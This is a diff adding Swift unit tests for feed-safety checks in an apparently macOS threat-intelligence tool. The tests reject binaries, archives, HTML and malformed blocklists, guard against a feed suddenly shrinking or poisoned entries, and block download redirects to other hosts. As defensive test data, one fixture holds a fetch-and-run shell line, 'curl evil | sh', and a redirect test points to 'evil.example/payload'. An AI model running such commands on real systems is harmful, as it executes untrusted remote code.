@@ -96,4 +96,65 @@ import Testing
         #expect(kev.map(\.cve) == ["CVE-2026-1"])
         #expect(kev[0].component == "CoreGraphics" && kev[0].advisory == "https://support.apple.com/en-us/125000")
     }
+
+    // MARK: Feed safety
+
+    func hageziList(_ domains: Int, ips: Int = 10) -> Data {
+        var lines = ["# HaGeZi"] + (0..<domains).map { "*.bad\($0).example" }
+        lines.append("#ips")
+        lines += (0..<ips).map { "45.1.2.\($0 % 250)" }
+        lines.append(String(repeating: "#", count: 60_000))           // padding to a plausible size (a comment)
+        return Data(lines.joined(separator: "\n").utf8)
+    }
+
+    @Test func aProgramOrArchiveIsNeverAcceptedAsAList() {
+        var macho = Data([0xCF, 0xFA, 0xED, 0xFE]); macho.append(Data(repeating: 0x41, count: 100_000))
+        #expect(FeedCheck.validate(.hagezi, macho, previousCount: 0)?.contains("program or archive") == true)
+        var zip = Data([0x50, 0x4B, 0x03, 0x04]); zip.append(Data(repeating: 0x41, count: 100_000))
+        #expect(FeedCheck.validate(.hagezi, zip, previousCount: 0) != nil)
+        let script = Data(("#!/bin/sh\ncurl evil | sh\n" + String(repeating: "x", count: 100_000)).utf8)
+        #expect(FeedCheck.validate(.hagezi, script, previousCount: 0) != nil)
+        #expect(FeedCheck.validate(.feodo, Data([0x41, 0x00, 0x42]), previousCount: 0)?.contains("binary") == true)
+    }
+
+    @Test func listsMustHaveTheirShape() {
+        #expect(FeedCheck.validate(.hagezi, hageziList(20_000), previousCount: 0) == nil)
+        let html = Data(("<html>" + String(repeating: "<p>blocked</p>\n", count: 10_000) + "\n#ips\n1.2.3.4").utf8)
+        #expect(FeedCheck.validate(.hagezi, html, previousCount: 0) != nil)
+        #expect(FeedCheck.validate(.feodo, Data("# Feodo\r\n50.16.16.211\r\n".utf8), previousCount: 0) == nil)
+        #expect(FeedCheck.validate(.feodo, Data("hello world\nnot an ip\n".utf8), previousCount: 0) != nil)
+        #expect(FeedCheck.validate(.kev, Data((String(repeating: " ", count: 60_000) + #"{"vulnerabilities":[]}"#).utf8), previousCount: 0)
+                != nil)
+    }
+
+    @Test func suddenCollapseOrExplosionKeepsThePreviousList() {
+        #expect(FeedCheck.validate(.hagezi, hageziList(20_000), previousCount: 300_000)?.contains("shrank") == true)
+        #expect(FeedCheck.validate(.hagezi, hageziList(20_000), previousCount: 3_000)?.contains("grew") == true)
+        #expect(FeedCheck.validate(.hagezi, hageziList(20_000), previousCount: 21_000) == nil)
+    }
+
+    @Test func majorProvidersAreNeverFlaggedButTheirCustomersCanBe() async throws {
+        let intel = try make()
+        try Data("# HaGeZi\napple.com\n*.github.io\nlogin-apple.github.io\n#ips\n45.1.2.3\n".utf8)
+            .write(to: intel.directory.appendingPathComponent("hagezi"))
+        await intel.load()
+        #expect(intel.listedDomain("www.apple.com") == nil)                       // a poisoned entry is ignored
+        #expect(intel.listedDomain("someone.github.io") == nil)
+        #expect(intel.listedDomain("login-apple.github.io") != nil)               // phishing on a shared host
+    }
+
+    @Test func downloadsMayNotBeRedirectedElsewhere() async {
+        let delegate = SameHostRedirects()
+        let task = URLSession.shared.dataTask(with: URL(string: "https://raw.githubusercontent.com/x")!)
+        let response = HTTPURLResponse(url: URL(string: "https://raw.githubusercontent.com/x")!, statusCode: 302, httpVersion: nil, headerFields: nil)!
+        var same: URLRequest??, other: URLRequest??
+        delegate.urlSession(.shared, task: task, willPerformHTTPRedirection: response,
+                            newRequest: URLRequest(url: URL(string: "https://raw.githubusercontent.com/y")!)) { same = $0 }
+        delegate.urlSession(.shared, task: task, willPerformHTTPRedirection: response,
+                            newRequest: URLRequest(url: URL(string: "https://evil.example/payload")!)) { other = $0 }
+        #expect(same != nil && same! != nil)
+        #expect(other != nil && other! == nil)
+        task.cancel()
+    }
 }
+
